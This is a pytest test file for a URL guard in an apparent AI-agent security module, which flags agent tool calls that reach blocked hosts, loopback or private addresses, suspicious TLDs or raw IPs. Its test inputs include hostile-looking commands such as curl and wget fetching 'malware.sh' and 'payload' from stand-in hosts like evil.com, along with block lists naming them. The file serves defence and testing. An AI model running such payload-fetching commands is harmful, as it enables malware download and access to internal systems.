# -*- coding: utf-8 -*-
# pylint: disable=redefined-outer-name,protected-access,unused-argument
"""Tests for UrlGuardian – URL-based tool-call guard.

Target: src/qwenpaw/security/tool_guard/url_guard/__init__.py
"""
from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from qwenpaw.security.tool_guard.url_guard import (
    UrlGuardian,
    _hostname,
    _is_loopback,
    extract_urls,
)

# Short alias for the module path used in patch() calls
_UG_MOD = "qwenpaw.security.tool_guard.url_guard"


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def mock_url_guard_config():
    """Mock config with empty URL guard settings."""
    url_guard_cfg = MagicMock()
    url_guard_cfg.enabled = True
    url_guard_cfg.blocked_hostnames = []
    url_guard_cfg.blocked_urls = []
    url_guard_cfg.allowed_urls = []
    url_guard_cfg.blocked_ip_ranges = []

    security_cfg = MagicMock()
    security_cfg.url_guard = url_guard_cfg

    app_cfg = MagicMock()
    app_cfg.security = security_cfg

    with patch(
        "qwenpaw.config.load_config", return_value=app_cfg,
    ):
        yield url_guard_cfg


@pytest.fixture
def url_guardian(mock_url_guard_config):
    """Create a default UrlGuardian with empty config."""
    return UrlGuardian(enabled=True)


# ---------------------------------------------------------------------------
# extract_urls tests
# ---------------------------------------------------------------------------


class TestExtractUrls:
    """Tests for the extract_urls() helper function."""

    def test_single_url(self):
        urls = extract_urls("curl http://example.com/file")
        assert urls == ["http://example.com/file"]

    def test_https_url(self):
        urls = extract_urls("download from https://secure.example.com/data.zip")
        assert "https://secure.example.com/data.zip" in urls

    def test_multiple_urls(self):
        urls = extract_urls(
            "curl http://a.com/1 && wget https://b.com/2",
        )
        assert len(urls) >= 2
        assert any("a.com" in u for u in urls)
        assert any("b.com" in u for u in urls)

    def test_no_url(self):
        urls = extract_urls("echo hello world")
        assert urls == []

    def test_empty_string(self):
        urls = extract_urls("")
        assert urls == []

    def test_deduplication(self):
        urls = extract_urls(
            "curl http://a.com/x http://a.com/x https://a.com/X",
        )
        assert len(urls) == 2  # http and https are different when lowercased diff

    def test_url_with_trailing_punctuation(self):
        urls = extract_urls("visit http://example.com/page.")
        assert urls == ["http://example.com/page"]

    def test_url_in_markdown_link(self):
        urls = extract_urls("[click](http://example.com/page) here")
        assert "http://example.com/page" in urls

    def test_url_with_port(self):
        urls = extract_urls("curl http://localhost:8080/api/v1")
        assert "http://localhost:8080/api/v1" in urls


# ---------------------------------------------------------------------------
# _hostname tests
# ---------------------------------------------------------------------------


class TestHostname:
    """Tests for _hostname() helper."""

    def test_standard_url(self):
        assert _hostname("http://example.com/path") == "example.com"

    def test_url_with_port(self):
        assert _hostname("http://example.com:8080/path") == "example.com"

    def test_ip_url(self):
        assert _hostname("http://192.168.1.1/api") == "192.168.1.1"

    def test_no_scheme(self):
        assert _hostname("example.com/path") == ""

    def test_invalid_url(self):
        assert _hostname("not-a-url") == ""


# ---------------------------------------------------------------------------
# _is_loopback tests
# ---------------------------------------------------------------------------


class TestIsLoopback:
    """Tests for _is_loopback() helper."""

    def test_localhost(self):
        assert _is_loopback("http://localhost:3000/api") is True

    def test_loopback_ipv4(self):
        assert _is_loopback("http://127.0.0.1:8080/x") is True

    def test_loopback_ipv6(self):
        assert _is_loopback("http://[::1]:8080/x") is True

    def test_private_ip_10(self):
        assert _is_loopback("http://10.0.0.5/api") is True

    def test_private_ip_172_16(self):
        assert _is_loopback("http://172.16.0.1/api") is True

    def test_private_ip_192_168(self):
        assert _is_loopback("http://192.168.1.100/api") is True

    def test_link_local(self):
        assert _is_loopback("http://169.254.1.1/api") is True

    def test_public_ip(self):
        assert _is_loopback("http://93.184.216.34/index.html") is False

    def test_public_domain(self):
        assert _is_loopback("http://example.com") is False

    def test_invalid_url(self):
        assert _is_loopback("not-a-url") is False


# ---------------------------------------------------------------------------
# UrlGuardian tests
# ---------------------------------------------------------------------------


class TestUrlGuardianBasic:
    """Basic UrlGuardian behavior tests."""

    def test_disabled_returns_empty(self, mock_url_guard_config):
        g = UrlGuardian(enabled=False)
        findings = g.guard(
            "execute_shell_command",
            {"command": "curl http://127.0.0.1/test"},
        )
        assert findings == []

    def test_no_urls_returns_empty(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": "echo hello world"},
        )
        assert findings == []

    def test_empty_command_returns_empty(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": ""},
        )
        assert findings == []

    def test_name_is_set(self, url_guardian):
        assert url_guardian.name == "url_guardian"

    def test_guardian_returns_list(self, url_guardian):
        result = url_guardian.guard("read_file", {"path": "/tmp/test.txt"})
        assert isinstance(result, list)


class TestBlocklist:
    """Blocklist matching tests (hostname-level vs full-URL-level)."""

    def test_exact_url_blocklist_match(self, mock_url_guard_config):
        # Full-URL-level pattern matches the entire URL.
        g = UrlGuardian(
            enabled=True,
            blocked_urls=["http://evil.com/malware.sh"],
        )
        findings = g.guard(
            "execute_shell_command",
            {"command": "curl http://evil.com/malware.sh"},
        )
        assert len(findings) == 1
        assert findings[0].rule_id == "URL_BLOCKLIST_URL"

    def test_glob_url_pattern_match(self, mock_url_guard_config):
        # A glob on the full URL still matches the URL endpoint.
        g = UrlGuardian(enabled=True, blocked_urls=["*evil.com*"])
        findings = g.guard(
            "execute_shell_command",
            {"command": "curl http://evil.com/anything"},
        )
        assert len(findings) == 1
        assert findings[0].rule_id == "URL_BLOCKLIST_URL"

    def test_hostname_blocklist_match(self, mock_url_guard_config):
        # Hostname-level pattern matches the hostname (whole domain).
        g = UrlGuardian(
            enabled=True,
            blocked_hostnames=["*.evil.com"],
        )
        findings = g.guard(
            "execute_shell_command",
            {"command": "wget https://sub.evil.com/payload"},
        )
        assert len(findings) == 1
        assert findings[0].rule_id == "URL_BLOCKLIST_HOST"

    def test_hostname_blocklist_subdomain(self, mock_url_guard_config):
        # A hostname pattern blocks every subdomain of the blocked domain.
        g = UrlGuardian(
            enabled=True,
            blocked_hostnames=["*csdn.net*"],
        )
        findings = g.guard(
            "execute_shell_command",
            {"command": "curl https://blog.csdn.net/article"},
        )
        assert len(findings) == 1
        assert findings[0].rule_id == "URL_BLOCKLIST_HOST"

    def test_hostname_pattern_does_not_match_url_path(self, mock_url_guard_config):
        # A hostname pattern must NOT match a full-URL glob that only the
        # URL-level list should catch.
        g = UrlGuardian(
            enabled=True,
            blocked_hostnames=["*.evil.com"],
        )
        findings = g.guard(
            "execute_shell_command",
            {"command": "wget https://sub.evil.com/payload"},
        )
        assert findings[0].rule_id == "URL_BLOCKLIST_HOST"

    def test_both_blocklists_validated(self, mock_url_guard_config):
        # A URL matching BOTH a hostname and a full-URL pattern yields
        # two findings (both interception methods run).
        g = UrlGuardian(
            enabled=True,
            blocked_hostnames=["*evil.com*"],
            blocked_urls=["http://evil.com/malware.sh"],
        )
        findings = g.guard(
            "execute_shell_command",
            {"command": "curl http://evil.com/malware.sh"},
        )
        rule_ids = {f.rule_id for f in findings}
        assert "URL_BLOCKLIST_HOST" in rule_ids
        assert "URL_BLOCKLIST_URL" in rule_ids

    def test_non_matching_url(self, mock_url_guard_config):
        g = UrlGuardian(enabled=True, blocked_urls=["*evil.com*"])
        findings = g.guard(
            "execute_shell_command",
            {"command": "curl https://github.com/repo"},
        )
        # Should only have built-in checks, not blocklist
        blocklist_findings = [
            f for f in findings
            if f.rule_id in ("URL_BLOCKLIST_HOST", "URL_BLOCKLIST_URL")
        ]
        assert len(blocklist_findings) == 0

    def test_finding_has_correct_fields(self, mock_url_guard_config):
        g = UrlGuardian(
            enabled=True, blocked_urls=["http://evil.com/malware.sh"],
        )
        findings = g.guard(
            "execute_shell_command",
            {"command": "curl http://evil.com/malware.sh"},
        )
        f = findings[0]
        assert f.category == "network_abuse"
        assert f.tool_name == "execute_shell_command"
        assert f.param_name == "command"
        assert f.guardian == "url_guardian"


class TestAllowlist:
    """Allowlist override tests."""

    def test_allowlist_overrides_blocklist(self, mock_url_guard_config):
        g = UrlGuardian(
            enabled=True,
            blocked_urls=["*evil.com*"],
            allowed_urls=["*evil.com*"],
        )
        findings = g.guard(
            "execute_shell_command",
            {"command": "curl http://evil.com/test"},
        )
        # Allowlist should let it through, but built-in checks still run
        block_findings = [
            f for f in findings
            if f.rule_id in ("URL_BLOCKLIST_HOST", "URL_BLOCKLIST_URL")
        ]
        assert len(block_findings) == 0

    def test_allowlist_does_not_affect_other_checks(self, mock_url_guard_config):
        """Allowlist bypasses all checks, including built-in ones.
        
        This is by design: if a URL is explicitly allowlisted, it should
        not be reported regardless of other checks.
        """
        g = UrlGuardian(
            enabled=True,
            blocked_urls=["*evil.com*"],
            allowed_urls=["*127.0.0.1*"],
        )
        findings = g.guard(
            "execute_shell_command",
            {"command": "curl http://127.0.0.1/test"},
        )
        # Allowlisted URLs should have no findings at all
        assert len(findings) == 0

    def test_allowlist_domain_pattern(self, mock_url_guard_config):
        g = UrlGuardian(
            enabled=True,
            blocked_urls=["*evil.com*"],
            allowed_urls=["http://evil.com/whitelist*"],
        )
        findings = g.guard(
            "execute_shell_command",
            {"command": "curl http://evil.com/whitelist/api"},
        )
        block_findings = [
            f for f in findings
            if f.rule_id in ("URL_BLOCKLIST_HOST", "URL_BLOCKLIST_URL")
        ]
        assert len(block_findings) == 0


class TestLoopbackDetection:
    """Tests for loopback/private IP detection."""

    @pytest.mark.parametrize("url", [
        "http://127.0.0.1:8080/api",
        "http://localhost:3000/",
        "http://10.0.0.5/admin",
        "http://192.168.1.100/test",
        "http://172.16.0.1/api",
    ])
    def test_loopback_detected(self, url_guardian, url):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": f"curl {url}"},
        )
        loopback = [f for f in findings if f.rule_id == "URL_LOOPBACK"]
        assert len(loopback) == 1, f"URL {url} should be detected as loopback"

    def test_public_url_not_loopback(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": "curl https://api.github.com/repos"},
        )
        loopback = [f for f in findings if f.rule_id == "URL_LOOPBACK"]
        assert len(loopback) == 0


class TestSuspiciousTld:
    """Tests for suspicious TLD detection."""

    @pytest.mark.parametrize("tld", ["tk", "ml", "ga", "cf", "gq", "xyz", "icu"])
    def test_suspicious_tld_detected(self, url_guardian, tld):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": f"curl http://malware.{tld}/payload"},
        )
        tld_findings = [f for f in findings if f.rule_id == "URL_SUSPICIOUS_TLD"]
        assert len(tld_findings) == 1, f"TLD .{tld} should be detected"

    def test_normal_tld_not_flagged(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": "curl https://example.com/page"},
        )
        tld_findings = [f for f in findings if f.rule_id == "URL_SUSPICIOUS_TLD"]
        assert len(tld_findings) == 0


class TestIpHostDetection:
    """Tests for raw IP host detection."""

    def test_ipv4_host_detected(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": "curl http://93.184.216.34/index.html"},
        )
        ip_findings = [f for f in findings if f.rule_id == "URL_IP_HOST"]
        assert len(ip_findings) == 1

    def test_ipv6_host_detected(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": "curl http://[2001:db8::1]/test"},
        )
        ip_findings = [f for f in findings if f.rule_id == "URL_IP_HOST"]
        assert len(ip_findings) == 1

    def test_domain_host_not_flagged(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": "curl https://github.com/repo"},
        )
        ip_findings = [f for f in findings if f.rule_id == "URL_IP_HOST"]
        assert len(ip_findings) == 0


class TestSeverityLevels:
    """Tests for correct severity assignment."""

    def test_loopback_is_high(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": "curl http://127.0.0.1/test"},
        )
        f = next(ff for ff in findings if ff.rule_id == "URL_LOOPBACK")
        assert f.severity.value == "HIGH"

    def test_blocklist_is_high(self, mock_url_guard_config):
        g = UrlGuardian(enabled=True, blocked_urls=["*evil.com*"])
        findings = g.guard(
            "execute_shell_command",
            {"command": "curl http://evil.com/test"},
        )
        f = next(
            ff for ff in findings
            if ff.rule_id in ("URL_BLOCKLIST_HOST", "URL_BLOCKLIST_URL")
        )
        assert f.severity.value == "HIGH"

    def test_suspicious_tld_is_medium(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": "curl http://malware.xyz/payload"},
        )
        f = next(ff for ff in findings if ff.rule_id == "URL_SUSPICIOUS_TLD")
        assert f.severity.value == "MEDIUM"

    def test_ip_host_is_low(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": "curl http://93.184.216.34/page"},
        )
        f = next(ff for ff in findings if ff.rule_id == "URL_IP_HOST")
        assert f.severity.value == "LOW"


class TestNonShellTools:
    """Tests for URL scanning in non-shell tools."""

    def test_url_in_read_file(self, url_guardian):
        findings = url_guardian.guard(
            "read_file",
            {"file_path": "http://127.0.0.1/file.txt"},
        )
        assert len(findings) > 0
        assert any(f.rule_id == "URL_LOOPBACK" for f in findings)

    def test_url_in_write_file(self, url_guardian):
        findings = url_guardian.guard(
            "write_file",
            {"file_path": "http://127.0.0.1/file", "content": "data"},
        )
        loopback = [f for f in findings if f.rule_id == "URL_LOOPBACK"]
        assert len(loopback) == 1

    def test_no_url_in_regular_params(self, url_guardian):
        findings = url_guardian.guard(
            "write_file",
            {"file_path": "/tmp/safe.txt", "content": "hello"},
        )
        assert len(findings) == 0


class TestBrowserUse:
    """browser_use URL scanning (url / cdp_url / actions_json)."""

    def test_browser_open_url_hostname_blocked(self, mock_url_guard_config):
        g = UrlGuardian(
            enabled=True,
            blocked_hostnames=["*csdn.net*"],
        )
        findings = g.guard(
            "browser_use",
            {"action": "open", "url": "https://www.csdn.net/article"},
        )
        assert any(f.rule_id == "URL_BLOCKLIST_HOST" for f in findings)

    def test_browser_open_url_endpoint_blocked(self, mock_url_guard_config):
        g = UrlGuardian(
            enabled=True,
            blocked_urls=["https://csdn.net/article/123*"],
        )
        findings = g.guard(
            "browser_use",
            {"action": "open", "url": "https://csdn.net/article/123"},
        )
        assert any(f.rule_id == "URL_BLOCKLIST_URL" for f in findings)

    def test_browser_cdp_url_blocked(self, mock_url_guard_config):
        g = UrlGuardian(
            enabled=True,
            blocked_hostnames=["*evil.com*"],
        )
        findings = g.guard(
            "browser_use",
            {"action": "connect_cdp", "cdp_url": "http://browser.evil.com:9222"},
        )
        assert any(f.rule_id == "URL_BLOCKLIST_HOST" for f in findings)

    def test_browser_actions_json_blocked(self, mock_url_guard_config):
        g = UrlGuardian(
            enabled=True,
            blocked_hostnames=["*csdn.net*"],
        )
        actions = {
            "actions": [
                {"type": "goto", "url": "https://blog.csdn.net/x"},
            ]
        }
        findings = g.guard(
            "browser_use",
            {"action": "batch", "actions_json": actions},
        )
        assert any(f.rule_id == "URL_BLOCKLIST_HOST" for f in findings)

    def test_browser_safe_url_passes(self, mock_url_guard_config):
        g = UrlGuardian(
            enabled=True,
            blocked_hostnames=["*csdn.net*"],
        )
        findings = g.guard(
            "browser_use",
            {"action": "open", "url": "https://example.com/page"},
        )
        assert not any(
            f.rule_id in ("URL_BLOCKLIST_HOST", "URL_BLOCKLIST_URL")
            for f in findings
        )


class TestEdgeCases:
    """Edge case tests."""

    def test_none_params(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": None},
        )
        assert findings == []

    def test_missing_command(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"not_command": "something"},
        )
        assert findings == []

    def test_url_with_special_chars(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": 'curl "http://127.0.0.1:8080/api?key=value&foo=bar"'},
        )
        assert len(findings) >= 1  # LOOPBACK + IP_HOST both fire
        assert "127.0.0.1" in findings[0].matched_value

    def test_long_url(self, url_guardian):
        long_url = "http://127.0.0.1/" + "a" * 500
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": f"curl {long_url}"},
        )
        assert len(findings) >= 1

    def test_to_dict(self, url_guardian):
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": "curl http://127.0.0.1/test"},
        )
        for f in findings:
            d = f.to_dict()
            assert d["rule_id"] in ("URL_LOOPBACK", "URL_IP_HOST", "URL_SUSPICIOUS_TLD")


class TestReload:
    """Tests for the reload() method."""

    def test_reload_does_not_crash(self, url_guardian):
        url_guardian.reload()
        # After reload, guardian should still work
        findings = url_guardian.guard(
            "execute_shell_command",
            {"command": "curl http://127.0.0.1/test"},
        )
        assert len(findings) > 0
